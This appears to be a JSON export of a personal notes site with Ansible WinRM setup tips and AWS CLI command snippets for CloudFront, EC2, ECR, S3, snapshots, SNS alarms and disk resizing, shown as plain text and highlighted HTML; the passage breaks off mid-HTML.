[{"categories":null,"contents":" Lookup # List all plugins ansible-doc -t lookup -l # Use `ansible-doc -t lookup \u0026lt;plugin\u0026gt;` to see detail ansible-doc -t lookup ping winrm - console output 在 hyper-v 那台機器 Enable Winrm 之後 一直出現下面的錯誤。 在 group 加上一行即可\nansible_winrm_transport=ntlm\nhyper-v01 | UNREACHABLE! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;ssl: the specified credentials were rejected by the server\u0026#34;, \u0026#34;unreachable\u0026#34;: true } - /etc/ansible/hosts ansible_user=administrator ansible_password=password ansible_port=5986 ansible_connection=winrm ansible_winrm_server_cert_validation=ignore ansible_winrm_transport=ntlm ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/ansible/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eLookup\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# List all plugins\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eansible-doc -t lookup -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use `ansible-doc -t lookup \u0026lt;plugin\u0026gt;` to see detail\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eansible-doc -t lookup ping\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ewinrm\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"--console-output\"\u003e- console output\u003c/h6\u003e\n\u003cp\u003e在 hyper-v 那台機器 Enable Winrm 之後 一直出現下面的錯誤。\n在 group 加上一行即可\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eansible_winrm_transport=ntlm\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003ehyper-v\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e|\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003eUNREACHABLE!\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e=\u0026gt;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;changed\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;msg\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ssl: the specified credentials were rejected by the server\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;unreachable\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"--etcansiblehosts\"\u003e- /etc/ansible/hosts\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_user\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eadministrator\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_password\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003epassword\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_port\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e5986\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_connection\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ewinrm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_winrm_server_cert_validation\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eignore\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_winrm_transport\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003entlm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Ansible Command"},{"categories":null,"contents":" CloudFront # list distributions aws cloudfront list-distributions --query \u0026#39;*.Items[*].[Comment,Id,Aliases.Items[0],DefaultCacheBehavior.TargetOriginId]\u0026#39; --output table # create invalidation aws cloudfront create-invalidation --distribution-id EATDVGD171BHDS1 --paths \u0026#34;/*\u0026#34; ## check cloudfornt log enable or not for i in $(aws cloudfront list-distributions --output table --query \u0026#39;DistributionList.Items[*].Id\u0026#39; --profile route53 | sed \u0026#39;1,3d;$d\u0026#39; | awk \u0026#39;{print $2}\u0026#39;) do result=$(aws cloudfront get-distribution --id ${i} --query \u0026#39;Distribution.DistributionConfig.Logging\u0026#39; --profile route53 | jq .Enabled) if [[ \u0026#34;${result}\u0026#34; != \u0026#34;true\u0026#34; ]];then echo ${i} fi done EC2 # list aws ec2 describe-instances --query \u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39; --output table --page-size 100 ECR # Get password and login to 12345.dkr.ecr.ap-northeast-1.amazonaws.com aws ecr get-login-password | docker login --username AWS --password-stdin 12345.dkr.ecr.ap-northeast-1.amazonaws.com S3 # Copy local file to S3 aws s3 cp ./pic.png s3://bucket_name/dir/ # Sync local local_dir to S3 aws s3 sync local_dir s3://bucket_name --exclude \u0026#39;gameConfig.json\u0026#39; --acl public-read --delete snapshot # list aws ec2 describe-snapshots \\ --owner-ids self \\ --query \u0026#34;Snapshots[?(Tags[0].Value==\u0026#39;backend\u0026#39;)].[SnapshotId,VolumeId]\u0026#34; \\ --region ap-northeast-1 # create aws ec2 create-snapshot --volume-id vol-02468851c2bc3bc4b --description \u0026#34;gitlab-$(date +%F)\u0026#34; --region ap-northeast-1 # delete aws ec2 delete-snapshot --snapshot-id snap-1234567890abcdef0 --region ap-northeast-1 sns region=\u0026#39;ap-east-1\u0026#39; account_id=\u0026#39;888886666321\u0026#39; topic=\u0026#39;sa\u0026#39; # create topic aws sns create-topic --name ${topic} # subscribe aws sns subscribe --topic-arn arn:aws:sns:${region}:${account_id}:${topic} --protocol email --notification-endpoint ricky@gmail.com # list aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:${region}:${account_id}:${topic} # create alarm ### metric-name ##CPUUtilization --\u0026gt;percent ##NetworkIn --\u0026gt;bytes ##NetworkOut --\u0026gt;bytes for line in $(aws ec2 describe-instances --query \u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39; --output table --page-size 100) do ID=$(echo ${line}|awk -F \u0026#39;,\u0026#39; \u0026#39;{print $1}\u0026#39;) VALUE=$(echo ${line}|awk -F \u0026#39;,\u0026#39; \u0026#39;{print $2}\u0026#39;) aws cloudwatch put-metric-alarm \\ --alarm-name ${ID}_netout \\ --metric-name NetworkOut \\ --namespace AWS/EC2 \\ --statistic Average \\ --period 300 \\ --threshold 2560000 \\ --comparison-operator GreaterThanOrEqualToThreshold \\ --dimensions \u0026#34;Name=InstanceId,Value=${VALUE}\u0026#34; \\ --evaluation-periods 3 \\ --alarm-actions arn:aws:sns:${region}:${account_id}:${topic} ##--unit Bytes echo \u0026#34;$ID done\u0026#34; done WAF aws wafv2 create-web-acl \\ --name acl_name \\ --scope CLOUDFRONT \\ --default-action Allow={} \\ --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=metric_acl_name \\ --rule Mount S3 Bucket on EC2 references: How to Mount S3 Bucket on Ubuntu 22.04 with S3FS Fuse\n# Installing s3fs-fuse sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install s3fs # Configuring AWS Credentials echo ACCESS_KEY_ID:SECRET_ACCESS_KEY \u0026gt; ${HOME}/.passwd-s3fs chmod 600 ${HOME}/.passwd-s3fs # Mounting the S3 Bucket s3fs mybucketname:/path/to/dir /path/to/local/mountpoint -o passwd_file=${HOME}/.passwd-s3fs # Ensuring Persistent Mounting echo \u0026#39;s3fs#mybucketname:/path/to/dir /path/to/local/mountpoint fuse _netdev,allow_other 0 0\u0026#39; | sudo tee -a /etc/fstab resize disk # 會在 FSTYPE 欄顯示 ext4 或 xfs lsblk -f # 擴大分割區 1 直到填滿整顆磁碟 # apt-get -y install cloud-guest-utils # 內含 growpart growpart /dev/xvda 1 # ext4 # xfs_growfs -d / # xfs resize2fs /dev/xvda1 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/aws/command/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCloudFront\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list distributions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws cloudfront list-distributions --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;*.Items[*].[Comment,Id,Aliases.Items[0],DefaultCacheBehavior.TargetOriginId]\u0026#39;\u003c/span\u003e --output table\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create invalidation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws cloudfront create-invalidation --distribution-id  EATDVGD171BHDS1  --paths \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## check cloudfornt log enable or not\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eaws cloudfront list-distributions --output table --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;DistributionList.Items[*].Id\u0026#39;\u003c/span\u003e --profile route53 | sed \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1,3d;$d\u0026#39;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eaws cloudfront get-distribution --id \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Distribution.DistributionConfig.Logging\u0026#39;\u003c/span\u003e --profile route53 | jq .Enabled\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eresult\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e !\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e;\u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eEC2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 describe-instances --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39;\u003c/span\u003e --output table --page-size \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Get password and login to 12345.dkr.ecr.ap-northeast-1.amazonaws.com\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ecr get-login-password | docker login --username AWS --password-stdin 12345.dkr.ecr.ap-northeast-1.amazonaws.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eS3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Copy local file to S3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws s3 cp ./pic.png s3://bucket_name/dir/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sync local local_dir to S3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws s3 sync local_dir s3://bucket_name --exclude \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;gameConfig.json\u0026#39;\u003c/span\u003e --acl public-read --delete\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esnapshot\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 describe-snapshots \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --owner-ids self \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Snapshots[?(Tags[0].Value==\u0026#39;backend\u0026#39;)].[SnapshotId,VolumeId]\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --region ap-northeast-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 create-snapshot --volume-id vol-02468851c2bc3bc4b --description \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;gitlab-\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edate +%F\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e --region ap-northeast-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# delete\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 delete-snapshot --snapshot-id snap-1234567890abcdef0 --region ap-northeast-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esns\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eregion\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ap-east-1\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaccount_id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;888886666321\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etopic\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;sa\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create topic\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws sns create-topic --name \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# subscribe\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws sns subscribe --topic-arn arn:aws:sns:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eregion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eaccount_id\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e --protocol email --notification-endpoint ricky@gmail.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eregion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eaccount_id\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create alarm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e### metric-name\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##CPUUtilization --\u0026gt;percent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##NetworkIn --\u0026gt;bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##NetworkOut --\u0026gt;bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e line in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eaws ec2 describe-instances --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39;\u003c/span\u003e --output table --page-size 100\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ID\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eecho \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eline\u003cspan 